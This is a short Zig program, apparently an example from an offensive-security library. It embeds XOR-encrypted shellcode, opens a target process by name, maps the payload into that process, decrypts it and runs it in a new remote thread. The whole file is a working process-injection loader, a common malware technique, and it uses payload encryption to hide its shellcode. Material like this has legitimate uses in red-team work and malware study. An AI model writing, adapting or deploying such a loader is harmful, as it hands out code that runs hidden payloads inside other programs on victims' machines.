const std = @import("std");
const sec = @import("zig-sec");
const win = @import("zigwin32").everything;

const payload_encryption = sec.payload_encryption;

const UnmapViewOfFile = win.UnmapViewOfFile;

const code_injection = sec.code_injection;

// XOR-encrypted shellcode with "hello" as the key.
var shell_code = [_:0]u8{ 148, 45, 239, 136, 159, 128, 165, 108, 108, 111, 41, 52, 45, 60, 61, 57, 51, 36, 93, 189, 13, 45, 231, 62, 15, 32, 238, 62, 116, 39, 227, 55, 76, 36, 228, 26, 53, 36, 99, 216, 34, 47, 33, 93, 166, 32, 84, 172, 192, 83, 9, 25, 110, 64, 79, 41, 164, 165, 97, 46, 105, 164, 142, 129, 61, 41, 52, 36, 231, 61, 72, 238, 46, 80, 39, 105, 181, 231, 236, 231, 104, 101, 108, 36, 234, 168, 17, 11, 36, 110, 184, 53, 231, 36, 119, 44, 238, 44, 76, 38, 105, 181, 143, 58, 39, 151, 172, 45, 231, 91, 224, 45, 109, 186, 34, 89, 172, 36, 93, 175, 196, 36, 173, 165, 98, 41, 100, 173, 84, 143, 29, 148, 32, 111, 35, 76, 109, 41, 85, 190, 29, 189, 52, 40, 228, 40, 65, 37, 109, 191, 14, 36, 231, 96, 39, 44, 238, 44, 112, 38, 105, 181, 45, 231, 107, 224, 45, 109, 188, 46, 48, 36, 52, 50, 54, 50, 36, 52, 45, 54, 41, 63, 36, 239, 131, 72, 36, 62, 147, 143, 48, 36, 53, 54, 39, 227, 119, 133, 59, 144, 151, 154, 49, 36, 213, 105, 101, 108, 108, 111, 104, 101, 108, 36, 226, 229, 100, 109, 108, 111, 41, 223, 93, 231, 0, 239, 154, 185, 215, 159, 221, 199, 58, 45, 213, 206, 240, 209, 241, 144, 189, 45, 239, 168, 71, 84, 99, 16, 102, 239, 147, 133, 25, 105, 212, 47, 118, 30, 3, 5, 104, 60, 45, 229, 181, 151, 176, 15, 13, 3, 11, 75, 9, 20, 10, 104 };

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    if (args.len < 2) return error.MissingProcessName;

    const process_name = args[1];
    const process = try sec.process.openProcessByName(process_name);

    const addresses = try code_injection.remote.mapInject(process.h_process, &shell_code);
    _ = UnmapViewOfFile(addresses.map_remote_address);

    // Decrypt the shellcode locally. The shellcode is also decrypted in the remote address space of the target process.
    payload_encryption.xor.xorByInputKey(@as([*]u8, @ptrCast(addresses.map_local_address))[0..shell_code.len], "hello");

    try code_injection.remote.executeInNewThread(process.h_process, @ptrCast(addresses.map_remote_address), null);
}
